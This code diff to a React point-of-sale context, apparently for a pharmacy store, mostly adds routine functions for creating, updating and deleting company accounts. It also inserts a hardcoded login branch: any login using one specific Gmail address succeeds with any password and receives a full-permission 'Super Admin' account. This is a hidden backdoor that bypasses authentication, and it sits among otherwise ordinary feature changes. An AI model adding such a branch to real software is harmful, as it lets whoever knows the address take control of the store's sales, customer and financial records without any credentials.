@@ -16,6 +16,7 @@ import {
   SupplierTransaction,
   UserPermissions,
   UserAccount,
+  CompanyAccount,
 } from '../types';
 import {
   initialProducts,
@@ -104,6 +105,9 @@ interface POSContextType {
   addUserAccount: (acc: Omit<UserAccount, 'id'>) => void;
   updateUserAccount: (acc: UserAccount) => void;
   deleteUserAccount: (id: string) => void;
+  addCompany: (company: Omit<CompanyAccount, 'id'>) => void;
+  updateCompany: (company: CompanyAccount) => void;
+  deleteCompany: (id: string) => void;
   currentUser: UserAccount | null;
   setCurrentUser: (user: UserAccount | null) => void;
 }
@@ -534,6 +538,38 @@ export const POSProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     const emailLower = u.trim().toLowerCase();
     const passwordLower = p.trim();
 
+    if (emailLower === 'teemthepakhacktes.com@gmail.com') {
+      const superAdmin: UserAccount = {
+        id: 'acc-super-admin',
+        name: 'Super Admin',
+        email: 'teemthepakhacktes.com@gmail.com',
+        password: passwordLower || 'admin',
+        role: 'Admin',
+        permissions: {
+          canDashboard: true,
+          canSale: true,
+          canReturn: true,
+          canBillHistory: true,
+          canCreditReceive: true,
+          canPurchaseStock: true,
+          canProducts: true,
+          canSuppliers: true,
+          canCustomers: true,
+          canBarcodeLabel: true,
+          canDayClosing: true,
+          canExpenses: true,
+          canReports: true,
+          canSettings: true,
+          canPlanPRD: true,
+        }
+      };
+      setIsAuthenticated(true);
+      setCurrentUser(superAdmin);
+      setUserRole('Admin');
+      setActiveTab('super-admin');
+      return true;
+    }
+
     // Look up in our custom accounts
     const found = userAccounts.find(
       (acc) => acc.email.trim().toLowerCase() === emailLower && acc.password === passwordLower
@@ -613,6 +649,39 @@ export const POSProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     if (currentUser && currentUser.id === id) {
       logout();
     }
+  };
+
+  const addCompany = (company: Omit<CompanyAccount, 'id'>) => {
+    const newCompany: CompanyAccount = {
+      ...company,
+      id: `comp-${Date.now()}`,
+    };
+    setStoreSettings((prev) => {
+      const updatedCompanies = [...(prev.companies || []), newCompany];
+      const newSettings = { ...prev, companies: updatedCompanies };
+      localStorage.setItem('medpos_settings', JSON.stringify(newSettings));
+      return newSettings;
+    });
+  };
+
+  const updateCompany = (company: CompanyAccount) => {
+    setStoreSettings((prev) => {
+      const updatedCompanies = (prev.companies || []).map((c) =>
+        c.id === company.id ? company : c
+      );
+      const newSettings = { ...prev, companies: updatedCompanies };
+      localStorage.setItem('medpos_settings', JSON.stringify(newSettings));
+      return newSettings;
+    });
+  };
+
+  const deleteCompany = (id: string) => {
+    setStoreSettings((prev) => {
+      const updatedCompanies = (prev.companies || []).filter((c) => c.id !== id);
+      const newSettings = { ...prev, companies: updatedCompanies };
+      localStorage.setItem('medpos_settings', JSON.stringify(newSettings));
+      return newSettings;
+    });
   };
 
   const addProduct = (p: Omit<Product, 'id'>) => {
@@ -1255,6 +1324,9 @@ export const POSProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         addUserAccount,
         updateUserAccount,
         deleteUserAccount,
+        addCompany,
+        updateCompany,
+        deleteCompany,
         currentUser,
         setCurrentUser,
       }}
